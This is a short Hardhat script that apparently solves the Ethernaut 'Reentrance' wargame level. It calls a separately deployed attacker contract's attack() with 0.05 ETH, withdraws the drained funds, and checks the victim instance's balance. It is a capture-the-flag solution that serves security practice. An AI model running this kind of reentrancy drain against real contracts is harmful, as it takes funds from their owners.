const { ethers } = require("hardhat");

const AMOUNT = ethers.utils.parseEther("0.05");
const ATTACKER_ADDRESS = "0xFF259089266e4ef25FcA292414E9907171717d31";
const INSTANCE_ADDRESS = "0xd8C44ca0A6B22eF099316623Fdac884ec45BD73F";

async function main() {
    const reentranceAttacker = await ethers.getContractAt("ReentranceAttack", ATTACKER_ADDRESS);
    const ethernautInstance = await ethers.getContractAt("Reentrance", INSTANCE_ADDRESS);

    
    // Execute the attack transaction.
    const attackTx = await reentranceAttacker.attack({value: AMOUNT, gasLimit: 500000});
    const txReceipt = await attackTx.wait();
    console.log(txReceipt);

    // Withdraw all the balance from attacker contract
    const withdrawTx = await reentranceAttacker.withdrawFunds();
    await withdrawTx.wait();

    const tx = await ethernautInstance.balanceOf(reentranceAttacker.address);
    console.log("bal: ", tx);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});